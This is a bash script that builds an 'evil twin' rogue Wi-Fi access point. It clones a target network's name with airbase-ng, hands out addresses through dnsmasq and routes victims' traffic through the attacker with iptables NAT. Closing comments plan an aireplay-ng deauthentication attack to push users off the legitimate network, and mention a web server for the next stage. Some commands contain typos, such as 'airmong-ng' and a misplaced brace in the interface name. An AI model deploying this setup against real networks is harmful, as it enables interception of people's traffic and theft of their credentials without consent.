#! /bin/bash

# this script sets up the evil twin

UPDATE=false
BRIDGE=wlan0 		# connected to internet, could be eth0 too
WLAN=wlan1			# monitor mode wirless adapter
ESSID=TEST
CHANNEL=11

if [ "$UPDATE" = true ]; then
	# update the device
	sudo apt-get update

	# install dnsmasq
	sudo apt-get install dnsmasq

	# Update Device
	sudo apt-get update
		
	# Install dnsmasq
	apt-get install dnsmasq
fi
	
# Configure dns masq
echo -e "\nConfiguring dnsmasq"
mkdir /root/Desktop/eviltwin
touch /root/Desktop/eviltwin/dnsmasq.conf
echo "interface=at0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1" >> /root/Desktop/eviltwin/dnsmasq.conf


# Update NetworkManager.conf, Add these lines to the end: 
echo -e "Configuring NetworkManager"
echo "
[keyfile]
unmanaged-devices:mac=AA:BB:CC:DD:EE:FF, A2:B2:C2:D2:E2:F2" >> /etc/NetworkManager/NetworkManager.conf


# Connect the usb network adapter
# 	see that it is connected with: iwconfig
# 	It should be named wlan0 or wlan1

# Enable the wireless adapter
echo -e "Enabled $WLAN"
ifconfig $WLAN up

# create the monitor network interface
echo -e "Creating $WLAN monitor interface"
airmong-ng start $WLAN

# start up the evil twin AP (access point)
# 	Give the evil twin the same name as the network you are attacking for best results
echo -e "starting evil twin"
airbase-ng -e $ESSID -c $CHANNEL "{$WLAN}mon"

# Give the evil twin can access the internet.
echo -e "Configuring at0 interface"
ifconfig at0

# give at0 an ip address: 
ifconfig at0 10.0.0.1 up

# route all traffic through at0
# 	For bridged Ethernet Adapter
# 	iptables --flush
# 	iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
# 	iptables --append FORWARD --in-interface at0 -j ACCEPT

# Otherwise bridged Wireless Adapter
iptables --flush
iptables --table nat --append POSTROUTING --out-interface $BRIDGE -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT

# enable port forwarding: 
echo -e "Enabling port forwarding"
echo 1 > /proc/sys/net/ipv4/ip_forward

# 13. evil twin is now setup, now need to allocate ip addresses to clients
dnsmasq -C /root/Desktop/eviltwin/dnsmasq.conf -d

echo -e "Success ${ESSID} is up"
# 14. NOW startup the webserver, see the tutorial for more info

# 15. Finally run the deauthorization attack and kick people off the legit network onto ours
# 	- TODO will add details on this later too

# 16. now deauthorize clients so they connect to our network
# 	aireplay-ng –deauth 0 -a <BSSID> wlan0mon
